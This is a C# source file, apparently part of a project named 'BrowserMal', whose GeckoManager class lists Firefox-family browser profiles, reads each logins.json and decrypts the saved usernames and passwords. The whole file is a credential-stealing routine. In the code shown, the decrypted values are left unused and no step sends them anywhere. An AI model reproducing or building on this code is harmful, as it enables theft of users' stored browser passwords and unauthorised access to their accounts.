using BrowserMal.Browser;
using BrowserMal.Model;
using Newtonsoft.Json;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace BrowserMal.Manager
{
    public class GeckoManager<T>
    {
        private readonly string tableName;
        private readonly SqliteTableModel sqliteTableModel;
        private readonly Dictionary<string, string> resultList;

        public GeckoManager(string tableName, SqliteTableModel sqliteTableModel)
        {
            this.tableName = tableName;
            this.sqliteTableModel = sqliteTableModel;
            resultList = new Dictionary<string, string>();
        }

        private List<string> GetAllProfiles(string root) => Directory.GetDirectories(root).ToList();

        public void Init(ref List<BrowserModel> browsers)
        {
            foreach (BrowserModel browser in browsers)
            {
                if (!Directory.Exists(browser.Location))
                    continue;

                List<string> profiles = GetAllProfiles(browser.Location);
                FetchFiles(profiles);
            }

        }

        private void FetchFiles(List<string> profiles)
        {
            foreach (string profile in profiles)
            {
                if (File.Exists(Path.Combine(profile, "logins.json")))
                {
                    Encryption.GeckoDecryption.Init(profile);

                    GeckoLogin geckoLogin;

                    using (StreamReader sr = new StreamReader(Path.Combine(profile, "logins.json")))
                    {
                        string json = sr.ReadToEnd();
                        geckoLogin = JsonConvert.DeserializeObject<GeckoLogin>(json);
                    }

                    foreach (GeckoLoginData login in geckoLogin.logins) 
                    {
                        string username = Encryption.GeckoDecryption.Decrypt(login.encryptedUsername);
                        string password = Encryption.GeckoDecryption.Decrypt(login.encryptedPassword);
                    }
                }
            }
        }
    }
}
